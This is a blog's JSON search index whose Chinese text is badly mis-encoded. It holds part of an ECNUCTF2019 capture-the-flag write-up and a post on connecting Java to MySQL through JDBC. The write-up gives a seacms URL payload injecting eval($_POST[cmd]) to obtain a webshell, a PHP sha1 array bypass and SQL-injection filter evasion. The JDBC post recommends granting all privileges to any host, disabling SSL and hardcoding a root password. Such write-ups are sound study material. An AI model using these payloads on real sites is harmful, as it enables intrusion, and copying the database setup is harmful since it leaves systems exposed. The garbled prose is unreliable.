flagã€‚è¿™ä¸ªåšæ³•çœŸçš„å¾ˆå‘ã€‚ ","date":"2019-03-31","objectID":"/ecnuctf2019/:6:0","tags":["SQLi","å¤å…¸å¯†ç ä¸ç¼–ç ","RSA"],"title":"ECNUCTF2019 åˆèµ› writeup","uri":"/ecnuctf2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"6. æˆ´æ˜Ÿç‚³ import requests from bs4 import BeautifulSoup import lxml url = \"http://47.103.43.235:82/web/a/index.php\" res = requests.session() ret = res.get(url) soup = BeautifulSoup(ret.content, 'lxml') t = eval(soup.children.__next__().next()[1].contents[0]) data = { 'result': t } flag = res.post(url, data=data) print(flag.text) ç”±äºè¦æ±‚ 2 ç§’å†…ç®—å‡ºï¼Œå› æ­¤è€ƒè™‘ç”¨ python è„šæœ¬å‘é€è¯·æ±‚ï¼Œå¹¶è®¡ç®—ç®—å¼çš„å€¼åæäº¤å¾—åˆ° flagã€‚ ","date":"2019-03-31","objectID":"/ecnuctf2019/:7:0","tags":["SQLi","å¤å…¸å¯†ç ä¸ç¼–ç ","RSA"],"title":"ECNUCTF2019 åˆèµ› writeup","uri":"/ecnuctf2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"7. å¤§ç¾æ™šæŠ¥ ï¼ˆå‡è£…è¿™é‡Œæœ‰ä¸€å¼ äºŒç»´ç å›¾ç‰‡ï¼‰ å¯¹æˆ‘æ¥è¯´æœ‰ç‚¹éš¾çš„ Misc é¢˜ã€‚ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ webï¼Œä½†æ˜¯æ ¹æœ¬æ²¡åŠæ³•é€šè¿‡è§£æäºŒç»´ç å¾—åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚åªèƒ½ä¸‹è½½å›¾ç‰‡ï¼Œbinwalk ä¸€ä¸‹ï¼Œæœç„¶æœ‰å‹ç¼©åŒ…ï¼š å›¾ 6 \" å›¾ 6 æ ¹æ®å¯†ç æ˜¯ç®¡ç†å‘˜ qq å·çš„çº¿ç´¢ï¼Œfcrackzip è·‘åŠå°æ—¶çˆ†ç ´ zip å¯†ç â€¦â€¦ å¾—åˆ° flagã€‚ ","date":"2019-03-31","objectID":"/ecnuctf2019/:8:0","tags":["SQLi","å¤å…¸å¯†ç ä¸ç¼–ç ","RSA"],"title":"ECNUCTF2019 åˆèµ› writeup","uri":"/ecnuctf2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"8. æ½˜æ±‰å¹´ s = u\"bg[`sZ*Zg'dPfP`VM_SXVd\" t = u\"\" for i in range(0, len(s)): t = t + chr(ord(s[i])+i+1+3) print(t) çœ‹åˆ°å¯†æ–‡å½¢å¼å¾ˆå®¹æ˜“æƒ³åˆ°å‡¯æ’’ï¼Œä½†æ˜¯æœ¬é¢˜çš„å…³é”®åœ¨äºçŒœå‡ºè¿™ä¸ªå‡¯æ’’å˜ä½“æ˜¯æ€ä¹ˆå˜çš„ã€‚çŒœçš„æ–¹æ³•å…¶å®å¾ˆé€šç”¨ï¼Œå°†å‰å››ä¸ªå­—æ¯å¯¹åº”åˆ° â€œflagâ€ï¼Œè§‚å¯Ÿå‡¯æ’’å˜æ¢çš„è§„å¾‹å³å¯ã€‚ ","date":"2019-03-31","objectID":"/ecnuctf2019/:9:0","tags":["SQLi","å¤å…¸å¯†ç ä¸ç¼–ç ","RSA"],"title":"ECNUCTF2019 åˆèµ› writeup","uri":"/ecnuctf2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"9. è¢æ®Š è™½ç„¶æˆ‘çŸ¥é“ RSA ç®—æ³•çš„åŸç†ï¼Œä½†è¿™é¢˜ä¼¼ä¹ä¾ç„¶åœ¨æˆ‘èƒ½åŠ›èŒƒå›´ä¹‹å¤–ã€‚å‚è€ƒäº† è¿™ç¯‡åšå®¢ã€‚ å…¶å®å°±æ˜¯åŸé¢˜æ”¹äº†æ•°æ®ï¼Œä¸»åŠæ–¹æœ‰ç‚¹ä¸èµ°å¿ƒå•Šã€‚ã€‚æŒ‰è‘«èŠ¦ç”»ç“¢ï¼Œå…ˆè§£å‡º e å’Œ nï¼š $ openssl rsa -pubin -text -modulus -in fllllllag.txt -in gy.key Public-Key: (256 bit) Modulus: 00:a9:bd:4c:7a:77:63:37:0a:04:2f:e6:be:c7:dd: c8:41:60:2d:b9:42:c7:a3:62:d1:b5:d3:72:a4:d0: 89:12:d9 Exponent: 65537 (0x10001) Modulus=A9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9 writing RSA key -----BEGIN PUBLIC KEY----- MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAKm9THp3YzcKBC/mvsfdyEFgLblCx6Ni 0bXTcqTQiRLZAgMBAAE= -----END PUBLIC KEY----- åœ¨ è¿™é‡Œ å› å¼åˆ†è§£ nï¼Œå¾—åˆ° p å’Œ qã€‚ æœ€åå†™ python è„šæœ¬å¾—åˆ° flagï¼š import gmpy2 import rsa p = 273821108020968288372911424519201044333 q = 280385007186315115828483000867559983517 n = 76775333340223961139427050707840417811156978085146970312315886671546666259161 e = 65537 d = int(gmpy2.invert(e, (p-1)*(q-1))) privatekey = rsa.PrivateKey(n, e, d, p, q) with open(\"fllllllag.txt\", \"rb\") as f: print(rsa.decrypt(f.read(), privatekey).decode()) ","date":"2019-03-31","objectID":"/ecnuctf2019/:10:0","tags":["SQLi","å¤å…¸å¯†ç ä¸ç¼–ç ","RSA"],"title":"ECNUCTF2019 åˆèµ› writeup","uri":"/ecnuctf2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"10. 76 å· éš¾é¢˜ã€‚ç”¨ IDA è§‚å¯Ÿäº†å¾ˆä¹…å¾ˆä¹…ï¼Œå”¯ä¸€æœ‰ç‚¹çº¿ç´¢çš„æ˜¯è¿™ä¸ªsub_8048580ï¼š å›¾ 7 \" å›¾ 7 ï¼ˆæ­¤å¤„çœç•¥äº†ä¸€éƒ¨åˆ†ä»£ç ï¼‰ å›¾ 8 \" å›¾ 8 çœ‹åˆ°äº†æ˜¾çœ¼çš„ 48 å’Œ 97ï¼ŒçŒœæµ‹æ˜¯æ ¹æ®è¾“å…¥å­—ç¬¦çš„ ASCII ç åˆ¤æ–­å¯†ç æ˜¯å¦æ­£ç¡®ï¼Œå°†ä¸Šé¢çš„ä»£ç ï¼ˆåªæˆªäº†ä¸€éƒ¨åˆ†ï¼‰ä»”ç»†æ•´ç†æˆè¡¨æ ¼æŸ¥çœ‹ï¼Œå¯ä»¥å¾—åˆ°è¿™æ ·ä¸€å¼ è¡¨ï¼ˆå·²å¯¹ç¬¬äºŒåˆ—å»é‡ï¼‰ï¼š 0 0 7 5 9 1 b 11 d 3 e 7 f 4/8 i 9 j 10 k 12 v 2 w 6 ä»è¿™å¼ è¡¨ä¸­è¿˜æ˜¯çœ‹ä¸å‡ºä»€ä¹ˆç«¯å€ªï¼Œç„¶è€Œå¦‚æœå•çœ‹ç¬¬äºŒåˆ—çš„è¯ï¼Œæ„Ÿè§‰ç¬¬äºŒåˆ—çš„æ‰€æœ‰æ•°å­—æ­£å¥½ç»„æˆäº†æ¨¡ 13 çš„æœ€å°éè´Ÿå®Œå…¨å‰©ä½™ç³»ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œ åœ¨è§£è°œæ¸¸æˆä¸­é‡åˆ°è¿™ç§å®Œå…¨å‰©ä½™ç³»ï¼Œä¸€èˆ¬éƒ½ä¼šè€ƒè™‘æŒ‡å‘æ€§è°œé¢˜ã€‚æœ¬é¢˜ä¹ŸåŒæ ·é€‚ç”¨ï¼Œå³æŠŠ 0 æ”¾åˆ°ç¬¬ 0 ä½ï¼Œ7 æ”¾åˆ°ç¬¬ 5 ä½ï¼Œ9 æ”¾åˆ°ç¬¬ 1 ä½â€¦â€¦ ä»¥æ­¤ç±»æ¨ï¼Œå°±å¯ä»¥å¾—åˆ° 13 ä½çš„å¯†ç ï¼Œä¹Ÿå°±æ˜¯ flag äº†ã€‚ $ ./obfuse Password: 09vdf7wefijbk Correct! ","date":"2019-03-31","objectID":"/ecnuctf2019/:11:0","tags":["SQLi","å¤å…¸å¯†ç ä¸ç¼–ç ","RSA"],"title":"ECNUCTF2019 åˆèµ› writeup","uri":"/ecnuctf2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"11. æ™´æ°”åº†èƒ¤ æŸ¥çœ‹æºä»£ç å‘ç°ï¼š å›¾ 9 \" å›¾ 9 è¯´æ˜è¦æ„é€ ä¸¤ä¸ªä¸åŒçš„å­—ç¬¦ä¸²ä¸”å®ƒä»¬çš„ md5 å€¼ç›¸åŒï¼Œå› æ­¤åœ¨ Burp/Postman ä¸­å‘é€ POST è¯·æ±‚ï¼š å›¾ 10 \" å›¾ 10 ","date":"2019-03-31","objectID":"/ecnuctf2019/:12:0","tags":["SQLi","å¤å…¸å¯†ç ä¸ç¼–ç ","RSA"],"title":"ECNUCTF2019 åˆèµ› writeup","uri":"/ecnuctf2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"12. æ¢…æ´¥ç¾æ²»éƒ åœ¨ IDA ä¸­æ‰“å¼€ Auth.exeï¼Œè§‚å¯Ÿ _main å‡½æ•°ï¼Œåœ¨å‡½æ•°æœ«å°¾å‘ç°ï¼š å›¾ 11 \" å›¾ 11 å¯ä»¥ç«‹å³å¾—åˆ°ç¬¬ä¸€å…³å¯†ç  â€œr0b0RUlez!â€œã€‚å¯¹äºç¬¬äºŒå…³å¯†ç ï¼Œå¯ä»¥ç¡®å®šçš„æ˜¯ä¾ç„¶ä¼šè°ƒç”¨ strcmp å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾åˆ° call strcmp è¯­å¥å¹¶è®¾ç½®æ–­ç‚¹ï¼Œæ­¤æ—¶ç¬¬äºŒå…³éœ€è¦çš„å¯†ç åº”è¯¥å¯ä»¥åœ¨æ ˆä¸­æ‰¾åˆ°ã€‚é¦–å…ˆæŸ¥æ‰¾ strcmp: å›¾ 12 \" å›¾ 12 è®¾ç½®æ–­ç‚¹å¹¶è°ƒè¯•ï¼š å›¾ 13 \" å›¾ 13 æŸ¥çœ‹ EAXï¼š å›¾ 14 \" å›¾ 14 å¾—åˆ°ç–‘ä¼¼ç¬¬äºŒå…³å¯†ç ï¼š å›¾ 15 \" å›¾ 15 è¾“å…¥åå‘ç°å¯†ç é”™è¯¯ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å›å»çœ‹ä¸€ä¸‹ï¼Œæˆ‘ä»¬å¿½ç•¥äº†ä»€ä¹ˆç¯èŠ‚ã€‚åœ¨ä¸Šå›¾çš„ _main ä¼ªä»£ç ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ° â€œYou passed level1!â€ åå°±æ²¡æœ‰çœ‹ä¸‹å»äº†ï¼Œç„¶è€Œä¸‹é¢çš„ sub_4015EA å´æ˜¯ç¬¬äºŒå…³çš„å…³é”®ï¼š å›¾ 16 \" å›¾ 16 è¿™é‡Œå‘ç”Ÿäº†å¼‚å¸¸è·³è½¬ã€‚æˆ‘ä»¬æŸ¥æ‰¾å®ƒçš„å¤–éƒ¨å¼•ç”¨ï¼Œè¿›å…¥äº† sub_40157F: å›¾ 17 \" å›¾ 17 è§åˆ°äº†è€æœ‹å‹ scanf å‡½æ•°ï¼Œä¸‹ä¸€æ­¥å½“ç„¶æ˜¯è·Ÿè¸ªè¿› sub_401547ï¼š å›¾ 18 \" å›¾ 18 ç­”æ¡ˆå¾ˆæ˜äº†äº†ã€‚åŸæ¥è¿™ä¸ªå‡½æ•°å¯¹æˆ‘ä»¬åˆšæ‰å¾—åˆ°çš„ â€œç¬¬äºŒå…³å¯†ç â€ åˆè¿›è¡Œäº†æŒ‰ä½å¼‚æˆ– 2ã€‚äºæ˜¯æˆ‘ä»¬ä½œåŒæ ·è®¡ç®—åå¾—åˆ°ç¬¬äºŒå…³å¯†ç ï¼š å›¾ 19 \" å›¾ 19 Flag åªéœ€è¦ç”¨ä¸‹åˆ’çº¿æ‹¼æ¥ä¸¤å…³å¯†ç å³å¯ã€‚ ","date":"2019-03-31","objectID":"/ecnuctf2019/:13:0","tags":["SQLi","å¤å…¸å¯†ç ä¸ç¼–ç ","RSA"],"title":"ECNUCTF2019 åˆèµ› writeup","uri":"/ecnuctf2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"13. å†ˆæ‘å®æ¬¡ æ˜¾ç„¶åˆæ˜¯ SQL æ³¨å…¥ï¼Œå”¯ä¸€çš„æ³¨å…¥ç‚¹åœ¨ idã€‚url ä¸­å‡ºç°çš„ id===QMï¼Œä¸‰ä¸ªç­‰å·çœ‹èµ·æ¥å¾ˆå¥‡æ€ªï¼Œå¤§èƒ†çŒœæµ‹ ==QM æ˜¯å€’ç½®çš„ Base64 ç¼–ç ï¼Œè§£ç  MQ== å¾—åˆ° 1ï¼Œæ­£å¥½ä¸åˆ—å‡ºæ•°æ®çš„ id ä¸€è‡´ã€‚å› æ­¤åªéœ€è¦å†™æ³¨å…¥è¯­å¥åè¿›è¡Œä¸€æ¬¡ Base64 ç¼–ç ï¼Œå†åè½¬å­—ç¬¦ä¸²å³å¯ã€‚ å¤šæ¬¡å°è¯•åå¾—å‡ºç»“è®ºï¼šæœ¬é¢˜è¿‡æ»¤äº†ç­‰å·ã€ç©ºæ ¼ã€unionã€selectã€or ç­‰å…³é”®å­—ï¼Œå› æ­¤é‡‡ç”¨åŒå†™ç»•è¿‡ã€åå…­è¿›åˆ¶ç»•è¿‡ã€æ³¨é‡Šç»•è¿‡ç­‰æ‰‹æ®µæ”¹å†™ SQL è¯­å¥å®ç°æ³¨å…¥ã€‚è¿™é‡Œ sqlmap å°±å¾ˆéš¾å¸®åˆ°æˆ‘ä»¬äº†ã€‚ å›¾ 20 \" å›¾ 20 ","date":"2019-03-31","objectID":"/ecnuctf2019/:14:0","tags":["SQLi","å¤å…¸å¯†ç ä¸ç¼–ç ","RSA"],"title":"ECNUCTF2019 åˆèµ› writeup","uri":"/ecnuctf2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"14. ä½œæˆ˜è®¡åˆ’ ç½‘ç«™å”¯ä¸€çš„æ³¨å…¥ç‚¹ä½äºæœç´¢æ¡†ï¼ŒæŸ¥é˜…æœ‰å…³ seacms æ¼æ´çš„èµ„æ–™æ¥æ„é€  payloadï¼š http://47.103.43.235:84/search.php?searchtype=5\u0026tid=\u0026area=eval($_POST[cmd]) å¹¶è¿æ¥èœåˆ€ / èšå‰‘ï¼Œæ‹¿åˆ°ç½‘ç«™ shell åå¯ä»¥åœ¨æ ¹ç›®å½•å‘ç° flag.txtã€‚ ","date":"2019-03-31","objectID":"/ecnuctf2019/:15:0","tags":["SQLi","å¤å…¸å¯†ç ä¸ç¼–ç ","RSA"],"title":"ECNUCTF2019 åˆèµ› writeup","uri":"/ecnuctf2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"15. æ± æ­¥æ´² åœ¨æºä»£ç ä¸­å‘ç°ï¼š \u003c!-- index.phps --\u003e è®¿é—®è¯¥æ–‡ä»¶ï¼Œå¾—åˆ°ï¼š \u003c?php error_reporting(0); $flag = '********'; if (isset($_POST['name']) and isset($_POST['password'])){ if ($_POST['name'] == $_POST['password']) print 'name and password must be different'; else if (sha1($_POST['name']) == sha1($_POST['password'])) die($flag); else print 'invalid password'; } ?\u003e å¯ä»¥çœ‹åˆ°è¿™é‡Œè¦æ±‚ï¼šname å’Œ password ä¸åŒï¼Œä¸” sha1 å€¼ç›¸åŒã€‚ç”±äº php ä¸­çš„ sha1 æ¼æ´ä¼šä½¿ä»»æ„ä¸¤ä¸ªæ•°ç»„çš„ sha1 å€¼ç›¸åŒï¼Œå› æ­¤æ„é€  payloadï¼š å›¾ 21 \" å›¾ 21 ","date":"2019-03-31","objectID":"/ecnuctf2019/:16:0","tags":["SQLi","å¤å…¸å¯†ç ä¸ç¼–ç ","RSA"],"title":"ECNUCTF2019 åˆèµ› writeup","uri":"/ecnuctf2019/"},{"categories":["æ¯”èµ›è®°å½•"],"content":"æ€»ç»“ ç”±äºå‚åŠ æ¯”èµ›å¤ªå°‘ï¼Œç»éªŒè¿˜æ˜¯æœ‰æ¬ ç¼ºï¼Œæ¯”èµ›æ—¶å¯¹å¾ˆå¤šå¸¸è§çš„æ¨¡å¼éƒ½æ²¡æœ‰è¶³å¤Ÿçš„æ•æ„Ÿåº¦ï¼Œè®¸å¤šå·¥å…·ä¹Ÿæ˜¯ç°åœºæ­èµ·æ¥ç”¨çš„ã€‚ Reverse å’Œ Pwn è¿˜æ˜¯è¶…çº§èœï¼Œåè€…å¹¶æ²¡æœ‰åœ¨åˆèµ›å‡ºç°ï¼Œä½†æ˜¯æ®è¯´å†³èµ›ä¼šæœ‰å¾ˆå¤š Pwn é¢˜ã€‚ã€‚è®°å¾—å»å¹´å†³èµ›å‘å‘† 5 å°æ—¶åšäº†é¢˜éšå†™ï¼Œå¸Œæœ›ä»Šå¹´èƒ½ä¸å«åº•ï¼Ÿ ","date":"2019-03-31","objectID":"/ecnuctf2019/:17:0","tags":["SQLi","å¤å…¸å¯†ç ä¸ç¼–ç ","RSA"],"title":"ECNUCTF2019 åˆèµ› writeup","uri":"/ecnuctf2019/"},{"categories":["æ¢ç´¢"],"content":"å¤§æ¦‚æ˜¯ç¬¬äºŒæ¬¡è¢« MySQL ç©äº†ï¼Œä¹Ÿå¯èƒ½æ˜¯ç¬¬ä¸‰æ¬¡ã€‚ ","date":"2019-03-25","objectID":"/jdbc-mysql/:0:0","tags":["Java","MySQL"],"title":"é€šè¿‡ JDBC è¿æ¥ MySQL","uri":"/jdbc-mysql/"},{"categories":["æ¢ç´¢"],"content":"ä½¿ç”¨ç¯å¢ƒ Java å¼€å‘ç¯å¢ƒï¼šWin10 + JDK1.8 + Idea MySQL ç‰ˆæœ¬ï¼š8.xï¼ˆå…¶å®ç”¨çš„æ˜¯ MariaDBï¼Œä¸è¿‡å·®ä¸å¤šï¼‰ MySQL çš„ JDBC é©±åŠ¨ç‰ˆæœ¬ï¼š8.xï¼ˆäº‹å®è¯æ˜ï¼Œè¿™ä¸ªå’Œ MySQL ç‰ˆæœ¬å·è‡³å°‘æœ€é«˜ä½å¿…é¡»æ˜¯ä¸€æ ·çš„ï¼‰ MySQL è¿è¡Œç¯å¢ƒï¼šVMware WorkStation 15 Player + Kali Linux 2.0 ","date":"2019-03-25","objectID":"/jdbc-mysql/:1:0","tags":["Java","MySQL"],"title":"é€šè¿‡ JDBC è¿æ¥ MySQL","uri":"/jdbc-mysql/"},{"categories":["æ¢ç´¢"],"content":"æµç¨‹ åœ¨ MySQL ä¸­æ–°å»ºæ•°æ®åº“ï¼Œä¾‹å¦‚å« testï¼Œå¯ä»¥æ–°å»ºä¸€äº›æ•°æ®è¡¨å¹¶æ’å…¥ä¸€äº›æ•°æ®ï¼Œä½¿å¾—åœ¨ Java ä¸­å¯ä»¥æ“ä½œå®ƒä»¬å¹¶çœ‹åˆ°ç»“æœã€‚ åœ¨ Idea ä¸­æ–°å»ºé¡¹ç›®ï¼Œå¯¼å…¥ MySQL é©±åŠ¨å¹¶ç¼–å†™ç¨‹åºã€‚ æ‰“åŒ…æˆ jar åŒ…ï¼Œæ”¾åˆ°è™šæ‹Ÿæœºé‡Œç”¨ java -jar xxx.jar è¿è¡Œã€‚ å°±è¿™ä¹ˆç®€å•ã€‚ç„¶è€Œå¦‚æ­¤ç®€å•çš„ä¸‰æ­¥ä¸­å±…ç„¶è¿˜èƒ½æœ‰é‚£ä¹ˆå¤šçš„å‘ç‚¹ã€‚ ","date":"2019-03-25","objectID":"/jdbc-mysql/:2:0","tags":["Java","MySQL"],"title":"é€šè¿‡ JDBC è¿æ¥ MySQL","uri":"/jdbc-mysql/"},{"categories":["æ¢ç´¢"],"content":"Idea å¯¼å…¥ MySQL é©±åŠ¨ è¿™é‡Œå¹¶ä¸å‘ã€‚Idea è¿˜æ˜¯å¾ˆå‹å¥½çš„ã€‚ File -\u003e Project Structure -\u003e Modules -\u003e Dependencies -\u003e Module Source -\u003e ç»¿è‰²åŠ å· -\u003e JARs or Directories -\u003e åé¢åº”è¯¥ä¸ç”¨è¯´äº† æå®šã€‚ ","date":"2019-03-25","objectID":"/jdbc-mysql/:3:0","tags":["Java","MySQL"],"title":"é€šè¿‡ JDBC è¿æ¥ MySQL","uri":"/jdbc-mysql/"},{"categories":["æ¢ç´¢"],"content":"å‘ç‚¹ å…¶å®åœ¨æˆ‘æŠŠ jar åŒ…æ”¾åˆ°æœåŠ¡å™¨ä¸Šè¿è¡Œåï¼Œè‡ªå§‹è‡³ç»ˆåªé‡åˆ°äº†è¿™ç§é”™è¯¯ï¼š java.sql.SQLNonTransientConnectionException: Could not create connection to database server. Attempted reconnect 3 times. Giving up. è¿™ä¸ªé”™è¯¯ä¼¼ä¹éå¸¸å¸¸è§ï¼Œå› ä¸ºèƒ½å¼•èµ·è¿™ä¸ªé”™è¯¯çš„å› ç´ å¤ªå¤šäº†ã€‚StackOverflow ä¸­çš„ä¸€ä¸ªè¶…æœ‰æ–™çš„é—®é¢˜ é‡Œçš„ä¸€äº›å›ç­”ç»™å‡ºäº†éå¸¸å¤šçš„è§£å†³æ–¹æ³•ã€‚æˆ‘å¼ºçƒˆå»ºè®®è¯»è€…ç‚¹è¿›é“¾æ¥çœ‹ä¸€ä¸‹å°¤å…¶æ˜¯ç¬¬ä¸€ä¸ªå›ç­”ï¼Œæ„Ÿå—ä¸€ä¸‹ MySQL çš„å‘ç‚¹ä¹‹å¤šã€ä¹‹ææ€–ã€‚å…¶ä¸­å¾ˆå¤šåŸå› æ˜¯æ¥æºäº MySQL 8.x ä¸ 5.x çš„å·¨å¤§å·®å¼‚ã€‚ æˆ‘æ®æ­¤å¯¹ç¨‹åºè¿›è¡Œäº†è®¸å¤šä¿®æ”¹ï¼ŒåŒ…å«çš„å‘ç‚¹æœ‰ï¼ˆç²—ä½“ä¸ºå¯èƒ½å¯¼è‡´è¿™æ¬¡é”™è¯¯çš„åŸå› ï¼‰ï¼š Java å¯èƒ½å°† localhost è§£æä¸º IPv6 åœ°å€ ::1ï¼Œè€Œä¸æ˜¯ IPv4 çš„ 127.0.0.1ï¼Œç„¶è€Œ MySQL åªè®¤åè€…ï¼›è§£å†³æ–¹æ³•æ˜¯æŠŠ localhost æ¢æˆ 127.0.0.1ã€‚ ç¡®ä¿è¿æ¥æ—¶çš„ç”¨æˆ·åä¸å¯†ç æ­£ç¡®ï¼Œä¸ºæ­¤æˆ‘é‡è®¾äº†ä¸‹å¯†ç ã€‚ åœ¨ url ä¸­è®¾ç½®å‚æ•° autoReconnect=true é˜²æ­¢æ„å¤–æ–­è¿ã€‚ åœ¨ url ä¸­è®¾ç½®å‚æ•° useUnicode=trueã€‚ åœ¨ url ä¸­è®¾ç½®å‚æ•° characterEncoding=utf-8ã€‚ åœ¨ url ä¸­è®¾ç½®å‚æ•° useSSL=falseã€‚ ä¸ä½¿ç”¨ SSLã€‚ï¼ˆä¼¼ä¹æ˜¯ 8.x æ–°è¦æ±‚ï¼‰ åœ¨ url ä¸­è®¾ç½®å‚æ•° serverTimezone=GMT%2B8ã€‚ è®¾ç½®æ—¶åŒºä¸ºä¸œ 8 åŒºï¼Œå½“ç„¶æœåŠ¡å™¨ä¹Ÿè¦è®¾ç½® set global time_zone='+8:00'ã€‚ï¼ˆä¼¼ä¹æ˜¯ 8.x æ–°è¦æ±‚ï¼‰ Class.forName(\"com.mysql.cj.jdbc.Driver\"); è€Œä¸æ˜¯ Class.forName(\"com.mysql.jdbc.Driver\");ï¼ˆ8.x æ–°ç‰¹æ€§ï¼Œå¾ˆé‡è¦ï¼‰ æ³¨é‡Šæ‰é…ç½®æ–‡ä»¶ä¸­çš„ bind-address ä¸€è¡Œï¼Œæ”¾è¡Œæ¥è‡ªæ‰€æœ‰ IP çš„è¿æ¥ã€‚ åœ¨ MySQL ä¸­è¿è¡Œå‘½ä»¤ GRANT ALL PRIVILEGES ON *.* TO 'user'@'%' IDENTIFIED BY 'password';ã€‚ åˆ«å¿˜äº†é‡å¯ MySQL æœåŠ¡ã€‚ ","date":"2019-03-25","objectID":"/jdbc-mysql/:4:0","tags":["Java","MySQL"],"title":"é€šè¿‡ JDBC è¿æ¥ MySQL","uri":"/jdbc-mysql/"},{"categories":["æ¢ç´¢"],"content":"åæ§½ æ²¡èŠ±å¤ªå¤šæ—¶é—´è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä¸è¿‡ä¸­é—´ä¸€åº¦æƒ³åœ¨è™šæ‹Ÿæœºä¸Šæ­ä¸ª LAMP å½“æœåŠ¡å™¨ç”¨ï¼ˆç­‰ç­‰ï¼ŒIP åœ°å€æ€ä¹ˆåŠï¼Ÿï¼‰ï¼Œä»¥ä¸ºé‚£æ ·å°±å¯ä»¥ä¸ç”¨è¸©è¿™äº›å‘äº†ã€‚æœ‰æœºä¼šè¯•è¯•ç”¨ Maven é¡¹ç›®è¿æ•°æ®åº“ã€‚ å¦å¤–ï¼Œæˆ‘è®°å¾—ä¸Šæ¬¡è¢« MySQL ç©æ˜¯å› ä¸º 5.x å’Œ 8.x ç‰ˆæœ¬å¯¹å¯†ç çš„å“ˆå¸Œæ–¹å¼ä¸ä¸€æ ·å§ï¼Ÿ ","date":"2019-03-25","objectID":"/jdbc-mysql/:5:0","tags":["Java","MySQL"],"title":"é€šè¿‡ JDBC è¿æ¥ MySQL","uri":"/jdbc-mysql/"},{"categories":["æ¢ç´¢"],"content":"2019.4.1 æ›´æ–° å¯¹äºä¸Šé¢ â€œè™šæ‹Ÿæœº IP åœ°å€â€ çš„å›ç­”ï¼šå†…ç½‘ IPã€‚æ˜¯æˆ‘å½“æ—¶è ¢äº†ã€‚æŠŠ IP åœ°å€æ¢æˆå†…ç½‘ IPï¼ˆå¦‚ä¸‹æ–¹ä»£ç ï¼‰å¯ä»¥ç›´æ¥åœ¨ Idea ä¸‹è°ƒè¯•ï¼Œæ–¹ä¾¿å¤šäº†ã€‚ é¡ºæ‰‹è´´ä¸ªä»£ç ï¼š import java.sql.*; import java.util.ArrayList; import java.util.Scanner; public class Main { public static void main(String[] args) { String url = \"jdbc:mysql://192.168.30.128:3306/test?\" + \"autoReconnect=true\u0026useUnicode=true\u0026characterEncoding=utf-8\u0026\" + \"useSSL=false\u0026serverTimezone=GMT%2B8\"; String userName = \"root\"; String password = \"celine\"; Connection conn; PreparedStatement stmt = null; ResultSet rs = null; String sql; Scanner sc = new Scanner(System.in); try { Class.forName(\"com.mysql.cj.jdbc.Driver\"); conn = DriverManager.getConnection(url, userName, password); System.out.println(\"Connected to MySQL via JDBC.\\n\"); System.out.println(\"Enter: [0] to get metadata, [1-9] to perform 9 tasks on the Movie database, [-1] to quit.\"); int op; while((op = sc.nextInt()) != -1) { switch (op) { case 0: //display metadata sql = \"show tables\"; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); ArrayList\u003cString\u003e tables = new ArrayList\u003c\u003e(); while (rs.next()) { tables.add(rs.getString(1)); } for(String table: tables) { sql = \"select * from\" + table + \"limit 1;\"; rs = stmt.executeQuery(sql); ResultSetMetaData metaData = rs.getMetaData(); System.out.println(\"table name:\" + table); System.out.println(\"columns:\\n\"); for(int i = 1; i \u003c= metaData.getColumnCount(); ++i) { System.out.println(\"\\t\" + metaData.getColumnName(i) + \"\\t\" + metaData.getColumnTypeName(i)); } System.out.println(); } break; case 1: sql = \"select count(*) from Movies;\"; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); while (rs.next()) { System.out.println(\"1. Number of movies:\" + rs.getInt(\"count(*)\")); } break; case 2: sql = \"select title from Movies;\"; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); System.out.println(\"2. All titles:\"); while (rs.next()) { System.out.println(rs.getString(\"title\")); } break; case 3: sql = \"select min(year) from Movies;\"; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); while (rs.next()) { System.out.println(\"3. Min year:\" + rs.getInt(\"min(year)\")); } break; case 4: sql = \"select count(*) from Actors;\"; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); while (rs.next()) { System.out.println(\"4. Number of actors:\" + rs.getInt(\"count(*)\")); } break; case 5: sql = \"select givenNames, familyName from Actors where familyName='Zeta-Jones';\"; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); System.out.println(\"5. Who's Zeta-Jones:\"); while (rs.next()) { System.out.println(rs.getString(\"givenNames\") +\" \" + rs.getString(\"familyName\")); } break; case 6: sql = \"select distinct(genre) from BelongsTo;\"; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); System.out.println(\"6. Genres:\"); while (rs.next()) { System.out.println(rs.getString(\"genre\")); } break; case 7: sql = \"select m.title, m.year from Movies m\" + \"join Directs s on (s.movie = m.id) \" + \"join Directors d on (s.director = d.id) \" + \"where d.familyName ='Spielberg';\"; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); System.out.println(\"7. Spielberg has directed:\"); while (rs.next()) { System.out.println(\"Title:\" + rs.getString(\"title\") + \"|\" + \"Year:\" + rs.getString(\"year\")); } break; case 8: sql = \"select a.givenNames, a.familyName from Actors a\" + \"where not exists (select id from Movies\" + \"except (select movie as id from AppearsIn where actor = a.id));\"; stmt = conn.prepareStatement(sql); rs = stmt.executeQuery(sql); System.out.println(\"8. Super actor:\"); while (rs.next()) { System.out.println(rs.getString(\"givenNames\") +\" \" + rs.getString(\"familyName\")); } break; case 9: /* sql = \"create view nDirected as\" + \"select d.id as director, count(s.movie) as ntimes \" + \"from Directors d left outer join Directs s on (d.id = s.director) 